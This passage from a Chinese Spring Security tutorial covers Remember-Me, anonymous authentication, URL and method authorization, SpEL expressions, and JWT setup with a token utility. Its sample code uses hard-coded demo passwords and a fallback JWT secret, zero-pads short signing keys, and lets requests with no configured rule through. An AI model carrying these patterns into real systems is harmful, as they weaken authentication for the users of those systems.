                response.setStatus(401);
                response.setContentType("application/json;charset=UTF-8");
                response.getWriter().write("{\"code\":401,\"message\":\"需要身份认证\"}");
            })
        )
        .sessionManagement(s -> s
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());

    return http.build();
}
```

```bash
# 使用 curl 测试 HTTP Basic 认证
curl -u admin:password123 http://localhost:8080/api/internal/health

# 等价于（手动 Base64 编码）
curl -H "Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=" http://localhost:8080/api/internal/health

# Base64 编码：echo -n "admin:password123" | base64
# 结果：YWRtaW46cGFzc3dvcmQxMjM=
```

---

## 2.8 Remember-Me 认证

### 两种实现方式对比

```
Simple Hash-Based Token（简单哈希）：
  Cookie 内容：Base64(username + ":" + expirationTime + ":" + md5Hash)
  md5Hash = md5(username + ":" + expirationTime + ":" + password + ":" + key)
  
  安全问题：如果 Cookie 被盗，在过期前都可以使用
  适合：低安全需求场景，简单易配置

Persistent Token（持久化Token，推荐）：
  Cookie 内容：series + ":" + token
  数据库存储：series / token / username / last_used
  
  安全特性：
  - 每次使用后 token 更新（防重放）
  - 检测到 token 不一致时（可能被盗），强制全部登出
  适合：生产环境
```

```java
@Configuration
@RequiredArgsConstructor
public class RememberMeConfig {

    private final DataSource dataSource;
    private final UserDetailsService userDetailsService;

    @Bean
    public PersistentTokenRepository persistentTokenRepository() {
        JdbcTokenRepositoryImpl repo = new JdbcTokenRepositoryImpl();
        repo.setDataSource(dataSource);
        return repo;
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .formLogin(form -> form
                .loginPage("/login")
                .permitAll()
            )
            .rememberMe(remember -> remember
                .key("uniqueAndSecretKey")                         // 签名密钥
                .rememberMeCookieName("remember-me")               // Cookie 名
                .rememberMeParameter("remember-me")                // 表单参数名
                .tokenValiditySeconds(7 * 24 * 3600)               // 7天有效期
                .tokenRepository(persistentTokenRepository())       // 持久化存储
                .userDetailsService(userDetailsService)             // 用于重新加载用户
                .alwaysRemember(false)                             // 不自动勾选
            );

        return http.build();
    }
}
```

```html
<!-- 登录表单中添加 remember-me 复选框 -->
<form method="post" action="/login">
    <input type="text"     name="username"    placeholder="用户名" />
    <input type="password" name="password"    placeholder="密码"   />
    <label>
        <input type="checkbox" name="remember-me" /> 记住我（7天内免登录）
    </label>
    <button type="submit">登录</button>
</form>
```

---

## 2.9 匿名认证（AnonymousAuthenticationFilter）

```java
// AnonymousAuthenticationFilter 核心源码
public class AnonymousAuthenticationFilter extends GenericFilterBean {

    private String key;
    private Object principal;
    private List<GrantedAuthority> authorities;

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
        // 只有当前 SecurityContext 中没有认证信息时才设置匿名用户
        if (SecurityContextHolder.getContext().getAuthentication() == null) {
            AnonymousAuthenticationToken anonymous = new AnonymousAuthenticationToken(
                key,
                principal,      // 默认 "anonymousUser"
                authorities     // 默认 [ROLE_ANONYMOUS]
            );
            SecurityContextHolder.getContext().setAuthentication(anonymous);
        }
        chain.doFilter(req, res);
    }
}

// 自定义匿名用户配置
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .anonymous(anon -> anon
            .principal("guest")                              // 匿名用户名
            .authorities("ROLE_GUEST")                       // 匿名用户权限
        )
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/public/**").hasRole("GUEST")  // 匿名用户可访问
            .requestMatchers("/api/**").authenticated()      // 需要真实认证
        );

    return http.build();
}

// 在代码中区分匿名用户和认证用户
@GetMapping("/info")
public ResponseEntity<?> getInfo(Authentication authentication) {
    if (authentication == null || !authentication.isAuthenticated()
            || authentication instanceof AnonymousAuthenticationToken) {
        return ResponseEntity.ok(Map.of("message", "您是匿名用户，欢迎浏览！"));
    }
    LoginUser user = (LoginUser) authentication.getPrincipal();
    return ResponseEntity.ok(Map.of("message", "欢迎回来，" + user.getNickname()));
}
```
---

# Part 3: 授权机制深度解析

## 3.1 授权核心架构（Spring Security 6.x）

Spring Security 6.x 采用 `AuthorizationManager` 替代了旧版的 `AccessDecisionManager + Voter` 体系。

```
授权决策流程（Spring Security 6.x）：

HTTP 请求
    |
    v
[AuthorizationFilter]
    |
    | 1. 获取当前 Authentication（来自 SecurityContextHolder）
    | 2. 将 Supplier<Authentication> 和 HttpServletRequest 传给 AuthorizationManager
    |
    v
[RequestMatcherDelegatingAuthorizationManager]
    |
    | 遍历已配置的 (RequestMatcher, AuthorizationManager) 规则对：
    | - 规则1: /admin/**      → AuthorityAuthorizationManager("ROLE_ADMIN")
    | - 规则2: /api/public/** → PermitAllAuthorizationManager
    | - 规则3: /api/**        → AuthenticatedAuthorizationManager
    |
    | 找到第一个匹配当前URL的规则，执行对应的 AuthorizationManager
    |
    v
[AuthorizationDecision]
    |
    +-- granted=true  → 继续执行请求（放行）
    |
    +-- granted=false → 抛出 AccessDeniedException
                     → ExceptionTranslationFilter 捕获
                     → 匿名用户 → 调用 AuthenticationEntryPoint（→ 401 / 跳转登录）
                     → 已认证用户 → 调用 AccessDeniedHandler（→ 403 Forbidden）
```

### AuthorizationManager 接口

```java
@FunctionalInterface
public interface AuthorizationManager<T> {
    /**
     * 检查是否授权
     * @param authentication 当前认证信息（Supplier，懒加载）
     * @param object         被保护的对象（URL请求或方法调用）
     * @return AuthorizationDecision（null表示弃权）
     */
    @Nullable
    AuthorizationDecision check(Supplier<Authentication> authentication, T object);

    default void verify(Supplier<Authentication> authentication, T object) {
        AuthorizationDecision decision = check(authentication, object);
        if (decision != null && !decision.isGranted()) {
            throw new AccessDeniedException("Access Denied");
        }
    }
}
```

---

## 3.2 旧版投票者架构（AccessDecisionManager，Spring Security 5.x）

虽然 6.x 已更换架构，但了解旧版有助于理解设计思路：

```
AccessDecisionManager 投票架构（5.x 旧版，仍可用）：

                   Authentication + ConfigAttribute（如 ROLE_ADMIN）
                            |
                            v
              +-----------------------------+
              |    AccessDecisionManager    |
              | （三种实现可选）              |
              +-----------------------------+
              |                             |
              |  AffirmativeBased（默认）    |  ← 任一赞成票即通过
              |  ConsensusBased             |  ← 赞成 > 反对则通过
              |  UnanimousBased             |  ← 全部赞成才通过
              +-----------------------------+
                            |
              +------+------+--------+
              |              |              |
              v              v              v
        RoleVoter    AuthenticatedVoter  WebExpressionVoter
          |                 |                    |
     检查角色           检查认证状态         解析 SpEL 表达式
   ROLE_ADMIN         isAuthenticated()    hasRole('ADMIN')
          |                 |                    |
     返回投票结果：
     ACCESS_GRANTED(+1) / ACCESS_DENIED(-1) / ACCESS_ABSTAIN(0)

三种策略对比：
+--------------------+------------------+------------------+
| AffirmativeBased   | ConsensusBased   | UnanimousBased   |
+--------------------+------------------+------------------+
| 有一票 +1 即通过    | 赞成票>反对票通过 | 所有票都 +1 才通过|
| 适合：宽松策略      | 适合：平衡策略   | 适合：严格策略    |
| 适合大多数场景      | 少用             | 银行等高安全场景  |
+--------------------+------------------+------------------+
```

---

## 3.3 授权表达式（SpEL）完整参考

Spring Security 的 SpEL 表达式内置了丰富的安全相关函数：

```java
// ============================================================
// 一、认证状态相关
// ============================================================

// 已认证（排除匿名用户）
@PreAuthorize("isAuthenticated()")

// 完全认证（非 remember-me，需要输入密码的认证）
@PreAuthorize("isFullyAuthenticated()")

// 是匿名用户
@PreAuthorize("isAnonymous()")

// 通过 remember-me 认证
@PreAuthorize("isRememberMe()")

// ============================================================
// 二、角色/权限相关
// ============================================================

// 有指定角色（自动添加 ROLE_ 前缀）
@PreAuthorize("hasRole('ADMIN')")
// 等价于：
@PreAuthorize("hasAuthority('ROLE_ADMIN')")

// 有任意一个角色
@PreAuthorize("hasAnyRole('ADMIN', 'MANAGER', 'SUPER_ADMIN')")

// 有指定权限（不加 ROLE_ 前缀，完整匹配）
@PreAuthorize("hasAuthority('user:list')")

// 有任意一个权限
@PreAuthorize("hasAnyAuthority('user:list', 'user:view', 'admin:all')")

// 全部放行
@PreAuthorize("permitAll()")

// 全部拒绝
@PreAuthorize("denyAll()")

// ============================================================
// 三、访问当前认证对象
// ============================================================

// 访问 authentication 对象
@PreAuthorize("authentication.name == 'admin'")

// 访问 principal（UserDetails 对象）
@PreAuthorize("principal.username == 'admin'")

// 检查具体字段（需要 LoginUser 有对应字段）
@PreAuthorize("principal.userId == #userId")

// ============================================================
// 四、引用方法参数（#参数名）
// ============================================================

// 只允许访问自己的数据，或管理员
@PreAuthorize("hasRole('ADMIN') or principal.userId == #userId")
public User getUserById(@PathVariable Long userId) { ... }

// 检查传入对象的字段
@PreAuthorize("hasRole('ADMIN') or principal.username == #dto.ownerUsername")
public void updateDocument(@RequestBody DocumentDTO dto) { ... }

// ============================================================
// 五、访问返回值（@PostAuthorize 专用）
// ============================================================

// 确保只返回自己的数据
@PostAuthorize("returnObject == null or returnObject.ownerId == principal.userId or hasRole('ADMIN')")
public Document getDocument(Long id) { ... }

// ============================================================
// 六、自定义 Bean 方法（@beanName.method）
// ============================================================

// 调用自定义权限服务
@PreAuthorize("@permissionSvc.canAccess(#resourceId, 'WRITE')")
public void updateResource(Long resourceId, Object data) { ... }

@PreAuthorize("@orgPermission.hasOrgAccess(authentication, #orgId)")
public OrgInfo getOrgInfo(Long orgId) { ... }

// ============================================================
// 七、组合表达式
// ============================================================

// AND 组合
@PreAuthorize("isFullyAuthenticated() and hasAuthority('sensitive:read')")

// OR 组合
@PreAuthorize("hasRole('ADMIN') or hasRole('SUPER_ADMIN')")

// NOT
@PreAuthorize("!isAnonymous()")

// 复杂组合
@PreAuthorize("(hasRole('ADMIN') or principal.userId == #userId) and isFullyAuthenticated()")
```

### 自定义权限评估服务

```java
@Service("permissionSvc")
@RequiredArgsConstructor
public class PermissionEvaluationService {

    private final ResourceRepository resourceRepository;

    /**
     * 检查当前用户是否有权限对资源执行指定操作
     * 用法：@PreAuthorize("@permissionSvc.canAccess(#resourceId, 'WRITE')")
     */
    public boolean canAccess(Long resourceId, String action) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth == null || !auth.isAuthenticated()) {
            return false;
        }

        LoginUser loginUser = (LoginUser) auth.getPrincipal();

        // 超级管理员拥有所有权限
        if (loginUser.getRoleCodes().contains("SUPER_ADMIN")) {
            return true;
        }

        // 检查用户是否有该资源的指定操作权限
        return resourceRepository.hasPermission(loginUser.getUserId(), resourceId, action);
    }

    /**
     * 数据权限：只能看自己部门的数据
     * 用法：@PreAuthorize("@permissionSvc.withinDept(#deptId)")
     */
    public boolean withinDept(Long deptId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        LoginUser loginUser = (LoginUser) auth.getPrincipal();

        // 管理员可以看所有部门
        if (loginUser.getRoleCodes().contains("ADMIN")) {
            return true;
        }

        // 普通用户只能看自己所在部门
        return deptId.equals(loginUser.getDeptId());
    }
}
```

---

## 3.4 URL 路径授权配置

### requestMatchers 详细用法

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.authorizeHttpRequests(auth -> auth

        // ① 静态资源放行（最高优先级，放最前面）
        .requestMatchers(
            "/",
            "/favicon.ico",
            "/error",
            "/static/**",
            "/public/**",
            "/resources/**"
        ).permitAll()

        // ② Swagger API 文档放行（开发/测试环境）
        .requestMatchers(
            "/swagger-ui.html",
            "/swagger-ui/**",
            "/v3/api-docs/**",
            "/swagger-resources/**",
            "/webjars/**"
        ).permitAll()

        // ③ 认证相关接口放行
        .requestMatchers("/api/auth/login", "/api/auth/register",
                         "/api/auth/refresh", "/api/auth/forgot-password").permitAll()

        // ④ 按 HTTP 方法限制
        .requestMatchers(HttpMethod.GET,    "/api/articles/**").permitAll()  // GET 公开
        .requestMatchers(HttpMethod.POST,   "/api/articles/**").hasRole("EDITOR")
        .requestMatchers(HttpMethod.PUT,    "/api/articles/**").hasRole("EDITOR")
        .requestMatchers(HttpMethod.DELETE, "/api/articles/**").hasRole("ADMIN")
        .requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()  // 预检请求放行

        // ⑤ 管理后台路径
        .requestMatchers("/admin/**").hasRole("ADMIN")
        .requestMatchers("/superadmin/**").hasRole("SUPER_ADMIN")

        // ⑥ 细粒度权限（与方法级注解配合）
        .requestMatchers("/api/system/user/**").hasAnyRole("ADMIN", "USER_MANAGER")
        .requestMatchers("/api/system/role/**").hasRole("ADMIN")
        .requestMatchers("/api/system/config/**").hasRole("SUPER_ADMIN")

        // ⑦ Actuator 监控端点（仅允许内网访问）
        .requestMatchers("/actuator/health").permitAll()
        .requestMatchers("/actuator/**").hasRole("MONITOR")

        // ⑧ 兜底规则（所有其他请求必须认证）
        .anyRequest().authenticated()
    );

    return http.build();
}
```

### 路径匹配规则详解

```
requestMatchers 支持 Ant 风格路径匹配：

?  → 匹配单个任意字符
*  → 匹配一层路径中的任意字符（不跨斜线）
** → 匹配多层路径（跨斜线）

示例：
/api/user/??    → 匹配 /api/user/ab, /api/user/12（2位字符）
/api/user/*     → 匹配 /api/user/tom, /api/user/admin（不含斜线的单段）
/api/user/**    → 匹配 /api/user/tom, /api/user/role/list（任意层级）
/api/*/info     → 匹配 /api/user/info, /api/order/info

注意事项：
1. 规则按配置顺序匹配，第一个匹配到的规则生效
2. 具体路径规则应放在通配符规则之前
3. anyRequest() 必须放在最后

错误写法（admin路径被 /** 先匹配到）：
  .anyRequest().authenticated()    ← 错误！放前面会匹配所有请求
  .requestMatchers("/admin/**").hasRole("ADMIN")  ← 永远不会执行

正确写法：
  .requestMatchers("/admin/**").hasRole("ADMIN")
  .anyRequest().authenticated()    ← 放最后
```

---

## 3.5 方法级安全完整指南

### 启用配置

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity(
    prePostEnabled = true,  // 开启 @PreAuthorize / @PostAuthorize / @PreFilter / @PostFilter
    securedEnabled = true,  // 开启 @Secured
    jsr250Enabled  = true   // 开启 @RolesAllowed（JSR-250）
)
public class SecurityConfig {
    // ...
}
```

### 四种注解详细用法

```java
@RestController
@RequestMapping("/api")
public class SecureController {

    // =====================================================
    // @PreAuthorize：执行前检查（最常用，支持 SpEL）
    // =====================================================

    @GetMapping("/users")
    @PreAuthorize("hasRole('ADMIN')")
    public List<User> listUsers() { ... }

    @GetMapping("/users/{id}")
    @PreAuthorize("hasRole('ADMIN') or principal.userId == #id")
    public User getUser(@PathVariable Long id) { ... }

    @PostMapping("/users")
    @PreAuthorize("hasAuthority('system:user:add') and isFullyAuthenticated()")
    public User createUser(@RequestBody UserCreateDTO dto) { ... }

    @DeleteMapping("/users/{id}")
    @PreAuthorize("hasRole('SUPER_ADMIN')")
    public void deleteUser(@PathVariable Long id) { ... }

    // =====================================================
    // @PostAuthorize：执行后检查（returnObject = 返回值）
    // 注意：方法会执行，只是对结果进行权限检查
    // =====================================================

    // 确保用户只能查看自己的数据（或管理员可以查看所有）
    @GetMapping("/orders/{id}")
    @PostAuthorize("returnObject == null or returnObject.userId == principal.userId or hasRole('ADMIN')")
    public Order getOrder(@PathVariable Long id) { ... }

    // =====================================================
    // @PreFilter：执行前对集合参数进行过滤
    // filterObject 代表集合中的每个元素
    // =====================================================

    // 批量删除时，过滤掉用户没权限删除的ID
    @DeleteMapping("/batch")
    @PreFilter("hasRole('ADMIN') or @permissionSvc.canDelete(filterObject)")
    public void batchDelete(List<Long> ids) { ... }

    // =====================================================
    // @PostFilter：执行后对返回集合进行过滤
    // filterObject 代表返回集合中的每个元素
    // =====================================================

    // 查询结果只返回用户有权限查看的记录
    @GetMapping("/documents")
    @PostFilter("filterObject.ownerId == principal.userId or hasRole('ADMIN')")
    public List<Document> getDocuments() { ... }

    // =====================================================
    // @Secured：简单角色检查（不支持 SpEL）
    // 需要写完整的 ROLE_ 前缀
    // =====================================================

    @GetMapping("/report")
    @Secured({"ROLE_ADMIN", "ROLE_REPORT_VIEWER"})
    public Report getReport() { ... }

    // =====================================================
    // @RolesAllowed：JSR-250 标准（不支持 SpEL）
    // 不需要 ROLE_ 前缀
    // =====================================================

    @GetMapping("/metrics")
    @RolesAllowed({"ADMIN", "MONITOR"})
    public Metrics getMetrics() { ... }
}
```

### 方法级安全的 AOP 原理

```
方法调用拦截流程（以 @PreAuthorize 为例）：

调用方
    |
    | userController.getUser(42L)
    v
[JDK动态代理 / CGLIB 代理]
    |
    v
[MethodSecurityInterceptor]（继承自 AbstractSecurityInterceptor）
    |
    | 1. 获取方法上的 @PreAuthorize("hasRole('ADMIN') or principal.userId == #id")
    | 2. 从 SecurityContextHolder 获取 Authentication
    | 3. 解析 SpEL 表达式（将 #id 替换为实际参数值 42）
    | 4. 调用 PreAuthorizeAuthorizationManager.check()
    |
    v
是否授权？
    |
    +-- 是 → 执行目标方法 userController.getUser(42L)
    |         → 执行后（如有 @PostAuthorize）再次检查返回值
    |         → 返回结果
    |
    +-- 否 → 抛出 AccessDeniedException
              → ExceptionTranslationFilter（HTTP层）捕获
              → 返回 403 Forbidden
              （不会执行目标方法）
```

---

## 3.6 自定义授权决策

### 实现 AuthorizationManager（动态权限）

```java
/**
 * 动态 URL 权限校验
 * 从数据库加载 URL 权限规则，而不是硬编码在配置文件中
 */
@Component
@RequiredArgsConstructor
public class DynamicAuthorizationManager implements AuthorizationManager<HttpServletRequest> {

    private final PermissionRepository permissionRepository;
    private final RedisTemplate<String, Object> redisTemplate;

    // 权限规则缓存（URL + Method → 所需权限编码）
    private volatile Map<String, String> urlPermissionMap;

    @Override
    public AuthorizationDecision check(Supplier<Authentication> authenticationSupplier,
                                        HttpServletRequest request) {
        Authentication authentication = authenticationSupplier.get();

        // 1. 未认证用户，拒绝
        if (authentication == null || !authentication.isAuthenticated()
                || authentication instanceof AnonymousAuthenticationToken) {
            return new AuthorizationDecision(false);
        }

        String requestUri    = request.getRequestURI();
        String requestMethod = request.getMethod();

        // 2. 从缓存/数据库加载权限规则
        Map<String, String> permMap = loadUrlPermissionMap();

        // 3. 查找该 URL+Method 所需权限
        String requiredPermission = findRequiredPermission(permMap, requestUri, requestMethod);

        // 4. 如果没有配置权限规则，默认允许（或根据业务决定是否拒绝）
        if (requiredPermission == null) {
            return new AuthorizationDecision(true);
        }

        // 5. 检查用户是否拥有所需权限
        boolean hasPermission = authentication.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .anyMatch(authority ->
                authority.equals(requiredPermission) ||
                authority.equals("ROLE_SUPER_ADMIN")  // 超管拥有所有权限
            );

        return new AuthorizationDecision(hasPermission);
    }

    /**
     * 加载 URL 权限映射（带缓存）
     */
    private Map<String, String> loadUrlPermissionMap() {
        if (urlPermissionMap == null) {
            synchronized (this) {
                if (urlPermissionMap == null) {
                    refreshPermissionMap();
                }
            }
        }
        return urlPermissionMap;
    }

    /**
     * 刷新权限缓存（供管理员在修改权限后调用）
     */
    public void refreshPermissionMap() {
        List<SysPermission> permissions = permissionRepository.findByTypeAndStatus(3, 1); // type=3:接口
        Map<String, String> map = new ConcurrentHashMap<>();
        for (SysPermission perm : permissions) {
            if (perm.getUrl() != null && perm.getMethod() != null && perm.getCode() != null) {
                String key = perm.getMethod().toUpperCase() + ":" + perm.getUrl();
                map.put(key, perm.getCode());
            }
        }
        this.urlPermissionMap = map;
    }

    /**
     * 支持 Ant 路径匹配（如 /api/users/{id}）
     */
    private String findRequiredPermission(Map<String, String> permMap,
                                           String requestUri, String requestMethod) {
        // 精确匹配优先
        String key = requestMethod.toUpperCase() + ":" + requestUri;
        if (permMap.containsKey(key)) {
            return permMap.get(key);
        }

        // Ant 路径匹配
        AntPathMatcher matcher = new AntPathMatcher();
        return permMap.entrySet().stream()
            .filter(entry -> {
                String[] parts = entry.getKey().split(":", 2);
                return parts.length == 2
                    && parts[0].equals(requestMethod.toUpperCase())
                    && matcher.match(parts[1], requestUri);
            })
            .map(Map.Entry::getValue)
            .findFirst()
            .orElse(null);
    }
}

// 在 SecurityFilterChain 中使用
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http,
                                                DynamicAuthorizationManager dynamicAuthorizationManager)
                                                throws Exception {
    http.authorizeHttpRequests(auth -> auth
        .requestMatchers("/api/auth/**").permitAll()
        .requestMatchers("/api/public/**").permitAll()
        // 其他请求使用动态授权
        .anyRequest().access(dynamicAuthorizationManager)
    );
    return http.build();
}
```
---

# Part 4: JWT 集成实战（无状态认证）

## 4.1 Session 认证 vs JWT 认证对比

```
Session 认证（有状态）：
+--------+       +----------+       +-------------+
| 客户端  |       |  Web服务器|       | Session存储  |
+--------+       +----------+       | (内存/Redis) |
    |                  |            +-------------+
    |-- POST /login -->|                  |
    |                  | 验证成功          |
    |                  |-- 创建Session -->|
    |                  |<-- Session ID ---|
    |<-- Set-Cookie: JSESSIONID=abc123 --|
    |                  |                  |
    |-- GET /data --->>|                  |
    |   Cookie: JSESSIONID=abc123         |
    |                  |-- 查询Session -->|
    |                  |<-- 用户数据 -----|
    |<-- 200 Data -----|                  |

问题：
  ✗ 服务器需存储Session，占内存
  ✗ 集群部署需要 Session 共享（Redis）
  ✗ 跨域场景复杂（Cookie 有同源限制）
  ✗ 移动端支持不友好
  ✗ 微服务间调用复杂

JWT 认证（无状态）：
+--------+       +----------+       +----------+
| 客户端  |       | Web服务器 |       |  DB/Redis |
+--------+       +----------+       +----------+
    |                  |                  |
    |-- POST /login -->|                  |
    |                  |-- 查询用户 ------>|
    |                  |<-- 用户信息 ------|
    |                  | 验证成功，生成JWT  |
    |<-- {token:xxx} --|  (不存服务器)      |
    |                  |                  |
    |-- GET /data --->>|                  |
    |   Auth: Bearer xxx                  |
    |                  | 验证JWT签名（无需查DB）
    |<-- 200 Data -----|                  |

优点：
  ✓ 服务器无状态，完美支持水平扩展
  ✓ 跨域友好（HTTP Header）
  ✓ 天然支持微服务（携带用户信息）
  ✓ 支持移动端/SPA/小程序
  ✓ 减少 DB 查询（信息内嵌 Token）

缺点：
  ✗ Token 无法主动失效（需黑名单机制）
  ✗ Token 较大（vs Session ID 的几个字节）
  ✗ 泄露后无法撤回（需 HTTPS + 短有效期）
  ✗ Payload 不加密（敏感信息不能存）
```

---

## 4.2 JWT 结构详解

```
JWT 由三部分组成，用 "." 分隔：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header（Base64URL编码）
.
eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IuW8oOmrmCIsInJvbGVzIjpbIlJPTEVfVVNFUiJdLCJpYXQiOjE2MzAwMDAwMDAsImV4cCI6MTYzMDA4NjQwMH0
.                                        ← Payload（Base64URL编码）
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature（HMAC/RSA签名）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Header（解码后）：
{
    "alg": "HS256",    ← 签名算法：HS256（HMAC-SHA256）
    "typ": "JWT"       ← Token 类型
}

常用签名算法：
  HS256  → HMAC + SHA256（对称加密，前后端共享同一密钥）
  HS512  → HMAC + SHA512（更安全）
  RS256  → RSA + SHA256（非对称，私钥签名，公钥验证，推荐OAuth2）
  ES256  → ECDSA + SHA256（比RSA更短，性能更好）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Payload（解码后）：
{
    "sub":   "user123",           ← Subject（主题/用户ID）
    "name":  "张三",               ← 自定义字段
    "roles": ["ROLE_USER"],       ← 自定义字段（角色）
    "perms": ["user:read"],       ← 自定义字段（权限）
    "iat":   1630000000,          ← Issued At（签发时间戳）
    "exp":   1630086400,          ← Expiration（过期时间戳）
    "iss":   "myapp",             ← Issuer（签发者）
    "jti":   "550e8400-e29b"      ← JWT ID（唯一标识，防重放）
}

注意：Payload 只是 Base64URL 编码，任何人都能解码！
     ✗ 不要存储：密码、身份证号、银行卡号等敏感信息
     ✓ 可以存储：用户名、角色、权限（非敏感的业务信息）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Signature 计算方式（HS256）：
  signature = HMACSHA256(
      base64UrlEncode(header) + "." + base64UrlEncode(payload),
      secretKey
  )
  
  任何对 Header 或 Payload 的篡改都会导致签名不匹配 → 验证失败
```

---

## 4.3 Maven 依赖配置

```xml
<!-- pom.xml -->
<dependencies>
    <!-- Spring Security -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-security</artifactId>
    </dependency>

    <!-- JJWT（JWT 实现库，推荐最新版）-->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-api</artifactId>
        <version>0.12.5</version>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-impl</artifactId>
        <version>0.12.5</version>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-jackson</artifactId>
        <version>0.12.5</version>
        <scope>runtime</scope>
    </dependency>

    <!-- Web -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <!-- JPA + MySQL -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-jpa</artifactId>
    </dependency>
    <dependency>
        <groupId>com.mysql</groupId>
        <artifactId>mysql-connector-j</artifactId>
        <scope>runtime</scope>
    </dependency>

    <!-- Redis（Token 黑名单 / 用户信息缓存）-->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-redis</artifactId>
    </dependency>

    <!-- Validation -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-validation</artifactId>
    </dependency>

    <!-- Lombok -->
    <dependency>
        <groupId>org.projectlombok</groupId>
        <artifactId>lombok</artifactId>
        <optional>true</optional>
    </dependency>
</dependencies>
```

---

## 4.4 JWT 配置（application.yml）

```yaml
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/security_demo?useSSL=false&serverTimezone=Asia/Shanghai
    username: root
    password: password
    driver-class-name: com.mysql.cj.jdbc.Driver

  data:
    redis:
      host: localhost
      port: 6379
      database: 1
      timeout: 5000ms

  jpa:
    hibernate:
      ddl-auto: update
    show-sql: false

# JWT 配置
jwt:
  # 密钥（生产环境从环境变量或配置中心读取，不要写死！）
  secret: ${JWT_SECRET:myVeryLongAndSecureSecretKeyForJWT2024AtLeast256Bits}
  # Access Token 有效期（分钟）
  access-token-expire: 30
  # Refresh Token 有效期（天）
  refresh-token-expire: 7
  # Token 前缀
  token-prefix: "Bearer "
  # Header 名称
  header: "Authorization"

logging:
  level:
    org.springframework.security: INFO
    com.example.security: DEBUG
```

---

## 4.5 JWT 工具类（完整实现）

```java
package com.example.security.util;

import io.jsonwebtoken.*;
import io.jsonwebtoken.io.Decoders;
import io.jsonwebtoken.security.Keys;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Component;

import javax.crypto.SecretKey;
import java.util.*;
import java.util.function.Function;

/**
 * JWT 工具类
 * 支持：生成 / 解析 / 验证 / 刷新 Token
 */
@Slf4j
@Component
public class JwtTokenUtil {

    @Value("${jwt.secret}")
    private String secretKey;

    @Value("${jwt.access-token-expire:30}")
    private long accessTokenExpireMinutes;

    @Value("${jwt.refresh-token-expire:7}")
    private long refreshTokenExpireDays;

    public static final String HEADER         = "Authorization";
    public static final String TOKEN_PREFIX   = "Bearer ";
    public static final String CLAIM_ROLES    = "roles";
    public static final String CLAIM_TYPE     = "type";
    public static final String CLAIM_USER_ID  = "uid";
    public static final String TYPE_ACCESS    = "access";
    public static final String TYPE_REFRESH   = "refresh";

    // ─────────────────────────── 生成 Token ──────────────────────────────

    /**
     * 生成 Access Token（包含用户ID、角色、权限信息）
     */
    public String generateAccessToken(LoginUser loginUser) {
        Map<String, Object> claims = new HashMap<>();
        claims.put(CLAIM_USER_ID, loginUser.getUserId());
        claims.put(CLAIM_ROLES,   loginUser.getRoleCodes());
        claims.put(CLAIM_TYPE,    TYPE_ACCESS);

        return buildToken(claims, loginUser.getUsername(),
                          accessTokenExpireMinutes * 60 * 1000L);
    }

    /**
     * 生成 Refresh Token（只包含用户名，有效期更长）
     */
    public String generateRefreshToken(String username) {
        Map<String, Object> claims = new HashMap<>();
        claims.put(CLAIM_TYPE, TYPE_REFRESH);
        return buildToken(claims, username, refreshTokenExpireDays * 24 * 60 * 60 * 1000L);
    }

    /**
     * 构建 JWT Token 核心方法
     */
    private String buildToken(Map<String, Object> extraClaims, String subject, long expireMillis) {
        long now = System.currentTimeMillis();
        return Jwts.builder()
            .claims(extraClaims)
            .subject(subject)
            .issuer("myapp")
            .issuedAt(new Date(now))
            .expiration(new Date(now + expireMillis))
            .id(UUID.randomUUID().toString())       // jti：唯一ID，防重放
            .signWith(getSigningKey(), Jwts.SIG.HS256)
            .compact();
    }

    // ─────────────────────────── 解析 Token ──────────────────────────────

    /**
     * 获取签名密钥
     */
    private SecretKey getSigningKey() {
        // 如果密钥是 Base64 编码的，用 Decoders.BASE64.decode
        // 否则直接用字节
        byte[] keyBytes = secretKey.getBytes();
        if (keyBytes.length < 32) {
            // 密钥不足32字节，补齐（生产环境应使用足够长的密钥）
            keyBytes = Arrays.copyOf(keyBytes, 32);
        }
        return Keys.hmacShaKeyFor(keyBytes);
    }

    /**
     * 解析 Token，获取所有 Claims
     * 会验证签名和过期时间
     */
    public Claims parseToken(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload();
    }

    /**
     * 提取指定 Claim
     */
